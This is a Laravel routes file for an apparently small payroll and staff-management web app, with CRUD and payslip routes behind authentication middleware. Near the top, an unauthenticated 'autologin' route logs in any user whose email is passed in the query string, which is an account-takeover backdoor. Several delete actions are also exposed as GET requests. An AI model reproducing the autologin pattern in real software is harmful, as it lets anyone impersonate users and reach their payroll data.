<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Auth;
use App\Http\Controllers\DepartmentController;
use App\Http\Controllers\SupplyzoneController;
use App\Http\Controllers\SupplyareaController;
use App\Http\Controllers\StaffController;
use App\Http\Controllers\SalaryCalculationController;
use App\Http\Controllers\MonthlyReportController;
use App\Http\Controllers\WorkingDaysController;
use App\Http\Controllers\ReportsController;

Route::get('/logout', function () {
    Auth::logout();

    return redirect()->route('login')->with('preventBack', true);
})->name('logout')->middleware('preventBackHistory');


Route::get('/', function () {
    return view('welcome');
});
 Route::get('autologin', function () {
        $email = $_GET['email'];
        $user = \App\Models\User::where('email', $email)->first();
        Auth::login($user, true);
        return redirect()->intended('/department/list');
    });
Auth::routes();

Route::get('/home', [App\Http\Controllers\HomeController::class, 'index'])->name('home');

Route::prefix('department')->middleware(['auth'])->group(function(){
    Route::get('/list', [DepartmentController::class, 'list'])->name('department.list');
    Route::get('/create', [DepartmentController::class, 'create'])->name('department.create');
    Route::post('/save', [DepartmentController::class, 'save'])->name('department.save');
    Route::get('/edit/{id}',[DepartmentController::class, 'edit'])->name('department.edit');
    Route::post('/update', [DepartmentController::class, 'update'])->name('department.update');
    Route::get('/delete', [DepartmentController::class, 'delete'])->name('department.delete');
});

Route::prefix('supplyzone')->middleware(['auth'])->group(function(){
    Route::get('/list', [SupplyzoneController::class, 'list'])->name('supplyzone.list');
    Route::get('/create', [SupplyzoneController::class, 'create'])->name('supplyzone.create');
    Route::post('/save', [SupplyzoneController::class, 'save'])->name('supplyzone.save');
    Route::get('/edit/{id}',[SupplyzoneController::class, 'edit'])->name('supplyzone.edit');
    Route::post('/update', [SupplyzoneController::class, 'update'])->name('supplyzone.update');
    Route::get('/delete', [SupplyzoneController::class, 'delete'])->name('supplyzone.delete');
});

Route::prefix('supplyarea')->middleware(['auth'])->group(function(){
    Route::get('/list', [SupplyareaController::class, 'list'])->name('supplyarea.list');
    Route::get('/create', [SupplyareaController::class, 'create'])->name('supplyarea.create');
    Route::post('/save', [SupplyareaController::class, 'save'])->name('supplyarea.save');
    Route::get('/edit/{id}',[SupplyareaController::class, 'edit'])->name('supplyarea.edit');
    Route::post('/update', [SupplyareaController::class, 'update'])->name('supplyarea.update');
    Route::get('/delete', [SupplyareaController::class, 'delete'])->name('supplyarea.delete');
});

Route::prefix('staff')->middleware(['auth'])->group(function(){
    Route::get('/list', [StaffController::class, 'list'])->name('staff.list');
    Route::get('/create', [StaffController::class, 'create'])->name('staff.create');
    Route::post('/save', [StaffController::class, 'save'])->name('staff.save');
    Route::get('/edit/{id}',[StaffController::class, 'edit'])->name('staff.edit');
    Route::post('/update/{id}', [StaffController::class, 'update'])->name('staff.update');
    Route::get('/delete', [StaffController::class, 'delete'])->name('staff.delete');
});

Route::prefix('salary-calculations')->middleware(['auth'])->group(function(){
    Route::get('/list', [SalaryCalculationController::class, 'list'])->name('salary-calculations.list');
    Route::get('/create', [SalaryCalculationController::class, 'create'])->name('salary-calculations.create');
    Route::post('/save', [SalaryCalculationController::class, 'save'])->name('salary-calculations.save');
    Route::get('/edit/{id}',[SalaryCalculationController::class, 'edit'])->name('salary-calculations.edit');
    Route::post('/update/{id}', [SalaryCalculationController::class, 'update'])->name('salary-calculations.update');
    Route::get('/delete', [SalaryCalculationController::class, 'delete'])->name('salary-calculations.delete');
});

Route::prefix('monthly_reports')->middleware(['auth'])->group(function(){
    Route::get('/list', [MonthlyReportController::class, 'list'])->name('monthly_reports.list');
    Route::get('/create', [MonthlyReportController::class, 'create'])->name('monthly_reports.create');
    Route::post('/save', [MonthlyReportController::class, 'save'])->name('monthly_reports.save');
    Route::get('/edit/{id}',[MonthlyReportController::class, 'edit'])->name('monthly_reports.edit');
    Route::post('/update/{id}', [MonthlyReportController::class, 'update'])->name('monthly_reports.update');
    Route::get('/delete/{id}/{month}', [MonthlyReportController::class, 'delete'])->name('monthly_reports.delete');
    //-------without pf----//
    Route::get('/payslip/{staff_id}/{id}/{month}', [MonthlyReportController::class, 'payslip'])->name('monthly_reports.payslip');
    Route::get('/generate/{staff_id}/{id}/{month}', [MonthlyReportController::class, 'generate'])->name('payslips.generate');
    Route::post('/calculate/payslip', [MonthlyReportController::class, 'calculate'])->name('calculate.payslip'); 
    Route::get('/download/{staff_id}/{id}/{month}', [MonthlyReportController::class, 'downloadPayslip'])->name('download.payslip');
    //-------with pf-----//
    Route::get('/payslipwithpf/{staff_id}/{id}/{month}', [MonthlyReportController::class, 'payslipwithpf'])->name('monthly_reports.payslipwithpf');
    Route::get('/payslipwithpf/generate/{staff_id}/{id}/{month}', [MonthlyReportController::class, 'generate'])->name('payslips.generate');
    Route::post('/payslipwithpf/calculate/payslip', [MonthlyReportController::class, 'calculatewithpf'])->name('calculate.payslipwithpf'); 
    Route::get('/payslipwithpf/download/{staff_id}/{id}/{month}', [MonthlyReportController::class, 'downloadPayslipwithpf'])->name('download.payslipwithpf');
});

Route::prefix('working_days')->middleware(['auth'])->group(function(){
    Route::get('/list', [WorkingDaysController::class, 'list'])->name('working_days.list');
    Route::get('/create', [WorkingDaysController::class, 'create'])->name('working_days.create');
    Route::post('/save', [WorkingDaysController::class, 'save'])->name('working_days.save');
    Route::get('/edit/{id}',[WorkingDaysController::class, 'edit'])->name('working_days.edit');
    Route::post('/update/{id}', [WorkingDaysController::class, 'update'])->name('working_days.update');
    Route::get('/delete', [WorkingDaysController::class, 'delete'])->name('working_days.delete');
});

Route::prefix('reports')->middleware(['auth'])->group(function(){
    Route::get('/slbob', [ReportsController::class, 'slbob'])->name('reports.slbob');
    Route::get('/sloba', [ReportsController::class, 'sloba'])->name('reports.sloba');
    Route::get('/slwithpf', [ReportsController::class, 'slwithpf'])->name('reports.slwithpf');
    Route::get('/slwithoutpf', [ReportsController::class, 'slwithoutpf'])->name('reports.slwithoutpf');
    Route::get('/excel_report', [ReportsController::class, 'excel_report'])->name('reports.excel_report');
    Route::get('/excel_report_edit/{id}', [ReportsController::class, 'excel_report_edit'])->name('reports.excel_report_edit');
    Route::post('/excel_report_edit/{update}', [ReportsController::class, 'excel_report_update'])->name('reports.excel_report_update');
});